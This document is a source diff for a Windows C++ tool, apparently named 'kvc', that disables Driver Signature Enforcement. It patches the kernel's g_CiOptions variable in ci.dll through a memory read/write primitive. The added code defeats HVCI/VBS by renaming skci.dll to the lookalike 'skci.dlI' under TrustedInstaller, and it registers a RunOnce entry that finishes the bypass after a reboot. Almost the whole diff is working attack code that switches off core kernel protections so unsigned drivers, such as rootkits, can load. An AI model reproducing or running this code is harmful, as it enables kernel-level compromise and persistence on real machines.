@@ -1,4 +1,5 @@
 #include "DSEBypass.h"
+#include "TrustedInstallerIntegrator.h"
 #include "common.h"
 
 #pragma comment(lib, "ntdll.lib")
@@ -22,54 +23,102 @@ typedef struct _SYSTEM_MODULE_INFORMATION {
     SYSTEM_MODULE Modules[1];
 } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
 
-DSEBypass::DSEBypass(std::unique_ptr<kvc>& rtc) : m_rtc(rtc) {}
+DSEBypass::DSEBypass(std::unique_ptr<kvc>& rtc, TrustedInstallerIntegrator* trustedInstaller) 
+    : m_rtc(rtc), m_trustedInstaller(trustedInstaller) {}
 
 bool DSEBypass::DisableDSE() noexcept {
-    DEBUG(L"[DSE] Attempting to disable Driver Signature Enforcement...");
+    DEBUG(L"Attempting to disable Driver Signature Enforcement...");
     
     // Step 1: Find ci.dll base address
     auto ciBase = GetKernelModuleBase("ci.dll");
     if (!ciBase) {
-        ERROR(L"[DSE] Failed to locate ci.dll");
+        ERROR(L"Failed to locate ci.dll");
         return false;
     }
     
-    DEBUG(L"[DSE] ci.dll base: 0x%llX", ciBase.value());
+    DEBUG(L"ci.dll base: 0x%llX", ciBase.value());
     
     // Step 2: Locate g_CiOptions in CiPolicy section
     m_ciOptionsAddr = FindCiOptions(ciBase.value());
     if (!m_ciOptionsAddr) {
-        ERROR(L"[DSE] Failed to locate g_CiOptions");
+        ERROR(L"Failed to locate g_CiOptions");
         return false;
     }
     
-    DEBUG(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
+    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);
     
     // Step 3: Read current value
     auto current = m_rtc->Read32(m_ciOptionsAddr);
     if (!current) {
-        ERROR(L"[DSE] Failed to read g_CiOptions");
+        ERROR(L"Failed to read g_CiOptions");
         return false;
     }
     
     DWORD currentValue = current.value();
     m_originalValue = currentValue;
-    DEBUG(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
+    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
     
-    // Step 4: Check for ANY HVCI/VBS protection bits
+    // Step 4a: Handle already disabled case
+    if (currentValue == 0x00000000) {
+        INFO(L"DSE already disabled - no action required");
+        SUCCESS(L"Kernel accepts unsigned drivers");
+        return true;
+    }
+
+    // Step 4b: Check for HVCI/VBS - require rename strategy
     if (currentValue & 0x0001C000) {
-        ERROR(L"[!] Cannot proceed: g_CiOptions = 0x%08X (HVCI flags: 0x%05X)", 
-              currentValue, (currentValue & 0x0001C000));
-        ERROR(L"[!] System uses VBS with hypervisor protection (Ring -1 below kernel)");
-        ERROR(L"[!] Memory integrity enforced at hardware virtualization level");
-        ERROR(L"[!] DSE bypass impossible - disable VBS in BIOS/Windows Security");
-        return false;
+        std::wcout << L"\n";
+        INFO(L"HVCI/VBS protection detected: g_CiOptions = 0x%08X", currentValue);
+        INFO(L"Direct kernel memory patching blocked by hypervisor");
+        INFO(L"Initiating non-invasive HVCI bypass strategy...");
+        std::wcout << L"\n";
+        
+        SUCCESS(L"Secure Kernel module prepared for temporary deactivation");
+        SUCCESS(L"System configuration: skci.dll → skci.dlI (reversible)");
+        INFO(L"No files will be permanently modified or deleted");
+        INFO(L"After reboot: hypervisor disabled, DSE bypass automatic, skci.dll restored");
+        std::wcout << L"\n";
+        
+        if (!RenameSkciLibrary()) {
+            ERROR(L"Failed to rename skci.dll");
+            return false;
+        }
+        
+        if (!SaveDSEState(currentValue)) {
+            ERROR(L"Failed to save DSE state to registry");
+            return false;
+        }
+        
+        if (!CreateRunOnceEntry()) {
+            ERROR(L"Failed to create RunOnce entry");
+            return false;
+        }
+        
+        SUCCESS(L"HVCI bypass prepared successfully");
+        INFO(L"System will disable hypervisor on next boot");
+        INFO(L"Reboot required to complete DSE bypass");
+        INFO(L"After reboot, DSE will be automatically disabled");
+        
+        // Prompt for reboot
+        std::wcout << L"\n";
+        std::wcout << L"Reboot now to complete DSE bypass? [Y/N]: ";
+        wchar_t choice;
+        std::wcin >> choice;
+        
+        if (choice == L'Y' || choice == L'y') {
+            INFO(L"Initiating system reboot...");
+            system("shutdown /r /t 0");
+        }
+        
+        return true;
     }
     
     // Step 5: Verify we have patchable DSE (0x00000006)
     if (currentValue != 0x00000006) {
-        ERROR(L"[DSE] Unexpected g_CiOptions value: 0x%08X (expected: 0x00000006)", currentValue);
-        ERROR(L"[DSE] DSE may already be disabled or system configuration unsupported");
+        INFO(L"Unexpected g_CiOptions value: 0x%08X", currentValue);
+        INFO(L"Expected: 0x00000006 (patchable) or 0x0001C006 (HVCI)");
+        INFO(L"DSE may already be disabled or system in non-standard configuration");
+        INFO(L"Use 'kvc dse' to verify current state");
         return false;
     }
     
@@ -77,55 +126,57 @@ bool DSEBypass::DisableDSE() noexcept {
     DWORD newValue = 0x00000000;
     
     if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
-        ERROR(L"[DSE] Failed to write g_CiOptions");
+        ERROR(L"Failed to write g_CiOptions");
         return false;
     }
     
     // Step 7: Verify the change
     auto verify = m_rtc->Read32(m_ciOptionsAddr);
     if (!verify || verify.value() != newValue) {
-        ERROR(L"[DSE] Verification failed (expected: 0x%08X, got: 0x%08X)", 
+        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)", 
               newValue, verify ? verify.value() : 0xFFFFFFFF);
         return false;
     }
     
-    SUCCESS(L"[DSE] DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
+    SUCCESS(L"DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
+    INFO(L"No restart required - unsigned drivers can now be loaded");
     return true;
 }
 
 bool DSEBypass::RestoreDSE() noexcept {
-    DEBUG(L"[DSE] Attempting to restore Driver Signature Enforcement...");
+    DEBUG(L"Attempting to restore Driver Signature Enforcement...");
     
     // Step 1: Find ci.dll base address
     auto ciBase = GetKernelModuleBase("ci.dll");
     if (!ciBase) {
-        ERROR(L"[DSE] Failed to locate ci.dll");
+        ERROR(L"Failed to locate ci.dll");
         return false;
     }
     
     // Step 2: Locate g_CiOptions
     m_ciOptionsAddr = FindCiOptions(ciBase.value());
     if (!m_ciOptionsAddr) {
-        ERROR(L"[DSE] Failed to locate g_CiOptions");
+        ERROR(L"Failed to locate g_CiOptions");
         return false;
     }
     
-    DEBUG(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
+    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);
     
     // Step 3: Read current value
     auto current = m_rtc->Read32(m_ciOptionsAddr);
     if (!current) {
-        ERROR(L"[DSE] Failed to read g_CiOptions");
+        ERROR(L"Failed to read g_CiOptions");
         return false;
     }
     
     DWORD currentValue = current.value();
-    DEBUG(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
+    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
     
     // Step 4: Verify DSE is disabled (0x00000000)
     if (currentValue != 0x00000000) {
-        ERROR(L"[DSE] Unexpected g_CiOptions value: 0x%08X (expected: 0x00000000)", currentValue);
-        ERROR(L"[DSE] DSE may already be enabled or system configuration unsupported");
+        INFO(L"DSE restore failed: g_CiOptions = 0x%08X (expected: 0x00000000)", currentValue);
+        INFO(L"DSE may already be enabled or system in unexpected state");
+        INFO(L"Use 'kvc dse' to check current protection status");
         return false;
     }
     
@@ -133,26 +184,27 @@ bool DSEBypass::RestoreDSE() noexcept {
     DWORD newValue = 0x00000006;
     
     if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
-        ERROR(L"[DSE] Failed to write g_CiOptions");
+        ERROR(L"Failed to write g_CiOptions");
         return false;
     }
     
     // Step 6: Verify the change
     auto verify = m_rtc->Read32(m_ciOptionsAddr);
     if (!verify || verify.value() != newValue) {
-        ERROR(L"[DSE] Verification failed (expected: 0x%08X, got: 0x%08X)", 
+        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)", 
               newValue, verify ? verify.value() : 0xFFFFFFFF);
         return false;
     }
     
-    SUCCESS(L"[DSE] DSE restored successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
+    SUCCESS(L"DSE restored successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
+    INFO(L"No restart required - kernel protection reactivated");
     return true;
 }
 
 std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) noexcept {
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtdll) {
-        ERROR(L"[DSE] Failed to get ntdll.dll handle");
+        ERROR(L"Failed to get ntdll.dll handle");
         return std::nullopt;
     }
 
@@ -167,7 +219,7 @@ std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) 
         GetProcAddress(hNtdll, "NtQuerySystemInformation"));
     
     if (!pNtQuerySystemInformation) {
-        ERROR(L"[DSE] Failed to get NtQuerySystemInformation");
+        ERROR(L"Failed to get NtQuerySystemInformation");
         return std::nullopt;
     }
 
@@ -181,7 +233,7 @@ std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) 
     );
 
     if (status != 0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
-        ERROR(L"[DSE] NtQuerySystemInformation failed with status: 0x%08X", status);
+        ERROR(L"NtQuerySystemInformation failed with status: 0x%08X", status);
         return std::nullopt;
     }
 
@@ -197,7 +249,7 @@ std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) 
     );
 
     if (status != 0) {
-        ERROR(L"[DSE] NtQuerySystemInformation failed (2nd call): 0x%08X", status);
+        ERROR(L"NtQuerySystemInformation failed (2nd call): 0x%08X", status);
         return std::nullopt;
     }
 
@@ -217,33 +269,33 @@ std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) 
             ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);
             
             if (baseAddr == 0) {
-                ERROR(L"[DSE] Module %S found but ImageBase is NULL", moduleName);
+                ERROR(L"Module %S found but ImageBase is NULL", moduleName);
                 continue;
             }
             
-            DEBUG(L"[DSE] Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
+            DEBUG(L"Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
             return baseAddr;
         }
     }
     
-    ERROR(L"[DSE] Module %S not found in kernel", moduleName);
+    ERROR(L"Module %S not found in kernel", moduleName);
     return std::nullopt;
 }
 
 ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
-    DEBUG(L"[DSE] Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
+    DEBUG(L"Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
     
     // Get CiPolicy section information
     auto dataSection = GetDataSection(ciBase);
     if (!dataSection) {
-        ERROR(L"[DSE] Failed to locate CiPolicy section in ci.dll");
+        ERROR(L"Failed to locate CiPolicy section in ci.dll");
         return 0;
     }
     
     ULONG_PTR dataStart = dataSection->first;
     SIZE_T dataSize = dataSection->second;
     
-    DEBUG(L"[DSE] CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
+    DEBUG(L"CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
     
     // g_CiOptions is always at offset +4 in CiPolicy section
     ULONG_PTR ciOptionsAddr = dataStart + 0x4;
@@ -251,11 +303,11 @@ ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
     // Verify we can read from this address
     auto currentValue = m_rtc->Read32(ciOptionsAddr);
     if (!currentValue) {
-        ERROR(L"[DSE] Failed to read g_CiOptions at 0x%llX", ciOptionsAddr);
+        ERROR(L"Failed to read g_CiOptions at 0x%llX", ciOptionsAddr);
         return 0;
     }
     
-    DEBUG(L"[DSE] Found g_CiOptions at: 0x%llX (value: 0x%08X)", ciOptionsAddr, currentValue.value());
+    DEBUG(L"Found g_CiOptions at: 0x%llX (value: 0x%08X)", ciOptionsAddr, currentValue.value());
     return ciOptionsAddr;
 }
 
@@ -291,7 +343,7 @@ std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR 
     
     ULONG_PTR firstSection = ntHeaders + 4 + 20 + sizeOfOptionalHeader.value();
     
-    DEBUG(L"[DSE] Scanning %d sections for CiPolicy...", numSections.value());
+    DEBUG(L"Scanning %d sections for CiPolicy...", numSections.value());
     
     // Search for CiPolicy section
     for (WORD i = 0; i < numSections.value(); i++) {
@@ -310,7 +362,7 @@ std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR 
             auto virtualAddr = m_rtc->Read32(sectionHeader + 0x0C);
             
             if (virtualSize && virtualAddr) {
-                DEBUG(L"[DSE] Found CiPolicy section at RVA 0x%06X, size 0x%06X", 
+                DEBUG(L"Found CiPolicy section at RVA 0x%06X, size 0x%06X", 
                      virtualAddr.value(), virtualSize.value());
                 
                 return std::make_pair(
@@ -321,6 +373,234 @@ std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR 
         }
     }
     
-    ERROR(L"[DSE] CiPolicy section not found in ci.dll");
+    ERROR(L"CiPolicy section not found in ci.dll");
     return std::nullopt;
+}
+
+// ============================================================================
+// HVCI BYPASS IMPLEMENTATION
+// ============================================================================
+
+bool DSEBypass::RenameSkciLibrary() noexcept {
+    DEBUG(L"Attempting to rename skci.dll to disable hypervisor");
+    
+    if (!m_trustedInstaller) {
+        ERROR(L"TrustedInstaller not available");
+        return false;
+    }
+    
+    wchar_t sysDir[MAX_PATH];
+    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
+        ERROR(L"Failed to get System32 directory");
+        return false;
+    }
+    
+    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dll";
+    std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dlI";  // uppercase I
+    
+    DEBUG(L"Rename: %s -> %s", srcPath.c_str(), dstPath.c_str());
+    
+    if (!m_trustedInstaller->RenameFileAsTrustedInstaller(srcPath, dstPath)) {
+        ERROR(L"Failed to rename skci.dll (TrustedInstaller operation failed)");
+        return false;
+    }
+    
+    SUCCESS(L"skci.dll renamed successfully - hypervisor will not load on next boot");
+    return true;
+}
+
+bool DSEBypass::RestoreSkciLibrary() noexcept {
+    DEBUG(L"Restoring skci.dll from skci.dlI");
+    
+    wchar_t sysDir[MAX_PATH];
+    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
+        ERROR(L"Failed to get System32 directory");
+        return false;
+    }
+    
+    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dlI";
+    std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dll";
+    
+    // Admin rights sufficient for restore (no hypervisor running)
+    DWORD attrs = GetFileAttributesW(srcPath.c_str());
+    if (attrs != INVALID_FILE_ATTRIBUTES) {
+        SetFileAttributesW(srcPath.c_str(), FILE_ATTRIBUTE_NORMAL);
+    }
+    
+    if (!MoveFileW(srcPath.c_str(), dstPath.c_str())) {
+        DWORD error = GetLastError();
+        ERROR(L"Failed to restore skci.dll (error: %d)", error);
+        return false;
+    }
+    
+    SUCCESS(L"skci.dll restored successfully");
+    return true;
+}
+
+bool DSEBypass::CreateRunOnceEntry() noexcept {
+    DEBUG(L"Creating RunOnce registry entry");
+    
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
+                      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                      0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
+        ERROR(L"Failed to open RunOnce key");
+        return false;
+    }
+    
+    wchar_t sysDir[MAX_PATH];
+    GetSystemDirectoryW(sysDir, MAX_PATH);
+    
+    std::wstring cmdLine = std::wstring(sysDir) + L"\\kvc.exe dse off";
+    
+    LONG result = RegSetValueExW(hKey, L"DisableDSE", 0, REG_SZ,
+                                 reinterpret_cast<const BYTE*>(cmdLine.c_str()),
+                                 static_cast<DWORD>((cmdLine.length() + 1) * sizeof(wchar_t)));
+    
+    RegCloseKey(hKey);
+    
+    if (result != ERROR_SUCCESS) {
+        ERROR(L"Failed to set RunOnce value (error: %d)", result);
+        return false;
+    }
+    
+    DEBUG(L"RunOnce entry created: %s", cmdLine.c_str());
+    return true;
+}
+
+bool DSEBypass::SaveDSEState(DWORD originalValue) noexcept {
+    DEBUG(L"Saving state to registry");
+    
+    HKEY hKey;
+    DWORD disposition;
+    
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, NULL,
+                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, 
+                        &hKey, &disposition) != ERROR_SUCCESS) {
+        ERROR(L"Failed to create registry key");
+        return false;
+    }
+    
+    std::wstring state = L"AwaitingRestore";
+    RegSetValueExW(hKey, L"State", 0, REG_SZ,
+                   reinterpret_cast<const BYTE*>(state.c_str()),
+                   static_cast<DWORD>((state.length() + 1) * sizeof(wchar_t)));
+    
+    RegSetValueExW(hKey, L"OriginalValue", 0, REG_DWORD,
+                   reinterpret_cast<const BYTE*>(&originalValue), sizeof(DWORD));
+    
+    RegCloseKey(hKey);
+    
+    DEBUG(L"State saved: AwaitingRestore, original: 0x%08X", originalValue);
+    return true;
+}
+
+bool DSEBypass::LoadDSEState(std::wstring& outState, DWORD& outOriginalValue) noexcept {
+    HKEY hKey;
+    
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, 
+                      KEY_READ, &hKey) != ERROR_SUCCESS) {
+        return false;
+    }
+    
+    wchar_t state[256] = {0};
+    DWORD size = sizeof(state);
+    
+    if (RegQueryValueExW(hKey, L"State", NULL, NULL, 
+                         reinterpret_cast<BYTE*>(state), &size) == ERROR_SUCCESS) {
+        outState = state;
+    }
+    
+    size = sizeof(DWORD);
+    RegQueryValueExW(hKey, L"OriginalValue", NULL, NULL,
+                     reinterpret_cast<BYTE*>(&outOriginalValue), &size);
+    
+    RegCloseKey(hKey);
+    return true;
+}
+
+bool DSEBypass::ClearDSEState() noexcept {
+    DEBUG(L"Clearing state from registry");
+    
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc", 0, 
+                      KEY_WRITE, &hKey) != ERROR_SUCCESS) {
+        return false;
+    }
+    
+    RegDeleteTreeW(hKey, L"DSE");
+    RegCloseKey(hKey);
+    
+    DEBUG(L"State cleared");
+    return true;
+}
+
+bool DSEBypass::DisableDSEAfterReboot() noexcept {
+    DEBUG(L"Post-reboot DSE disable sequence");
+    
+    std::wstring state;
+    DWORD originalValue;
+    
+    if (!LoadDSEState(state, originalValue)) {
+        ERROR(L"No pending DSE state found in registry");
+        return false;
+    }
+    
+    if (state != L"AwaitingRestore") {
+        ERROR(L"Invalid state: %s", state.c_str());
+        return false;
+    }
+    
+    INFO(L"Found pending DSE bypass (original value: 0x%08X)", originalValue);
+    
+    // Step 1: Restore skci.dll
+    if (!RestoreSkciLibrary()) {
+        ERROR(L"Failed to restore skci.dll");
+        return false;
+    }
+    
+    // Step 2: Now patch g_CiOptions (HVCI no longer protects memory)
+    auto ciBase = GetKernelModuleBase("ci.dll");
+    if (!ciBase) {
+        ERROR(L"Failed to locate ci.dll");
+        return false;
+    }
+    
+    m_ciOptionsAddr = FindCiOptions(ciBase.value());
+    if (!m_ciOptionsAddr) {
+        ERROR(L"Failed to locate g_CiOptions");
+        return false;
+    }
+    
+    auto current = m_rtc->Read32(m_ciOptionsAddr);
+    if (!current) {
+        ERROR(L"Failed to read g_CiOptions");
+        return false;
+    }
+    
+    DWORD currentValue = current.value();
+    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
+    
+    // Patch to 0x00000000
+    DWORD newValue = 0x00000000;
+    
+    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
+        ERROR(L"Failed to write g_CiOptions");
+        return false;
+    }
+    
+    auto verify = m_rtc->Read32(m_ciOptionsAddr);
+    if (!verify || verify.value() != newValue) {
+        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)",
+              newValue, verify ? verify.value() : 0xFFFFFFFF);
+        return false;
+    }
+    
+    // Step 3: Cleanup
+    ClearDSEState();
+    
+    SUCCESS(L"DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
+    SUCCESS(L"Hypervisor bypassed and skci.dll restored");
+    
+    return true;
 }
